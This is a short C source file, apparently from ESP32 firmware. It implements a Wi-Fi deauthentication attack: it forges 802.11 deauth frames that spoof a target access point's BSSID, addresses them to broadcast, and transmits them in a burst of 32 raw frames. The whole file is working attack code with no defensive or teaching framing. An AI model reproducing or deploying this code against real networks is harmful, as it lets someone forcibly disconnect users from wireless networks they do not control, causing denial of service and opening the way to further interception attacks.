#include "deauth.h"
#include "esp_err.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_wifi_types_generic.h"
#include <stdint.h>
#include <string.h>

#define NUM_FRAMES_BROADCAST 32

static const char *TAG = "wifi_controller/deauth";

typedef struct {
  uint8_t frame_ctrl[2];
  uint8_t duration[2];
  uint8_t dest[6];
  uint8_t src[6];
  uint8_t bssid[6];
  uint8_t sequence_ctrl[2];
  uint8_t reason[2];
} deauth_frame_t;

static deauth_frame_t deauth_frame = {
    .frame_ctrl = {0xC0, 0x00},
    .duration = {0x00, 0x00},
    .dest = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
    .src = {0},
    .bssid = {0},
    .sequence_ctrl = {0xF0, 0xFF},
    .reason = {0x02, 0x00},
};

void wifictl_deauth(const uint8_t target_bssid[6], const int channel) {


  // Pushes the target MAC address into source and BSSID fields
  memcpy(deauth_frame.src, target_bssid, 6);
  memcpy(deauth_frame.bssid, target_bssid, 6);

  ESP_LOGI(TAG,
           "Broadcasting deauth frames from: %02X:%02X:%02X:%02X:%02X:%02X",
           deauth_frame.bssid[0], deauth_frame.bssid[1], deauth_frame.bssid[2],
           deauth_frame.bssid[3], deauth_frame.bssid[4], deauth_frame.bssid[5]);

  for (int i = 0; i < NUM_FRAMES_BROADCAST; i++) {
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame,
                                      sizeof(deauth_frame), false));
  }

  ESP_LOGI(TAG, "Stop broadcasting deauth frames...");
}
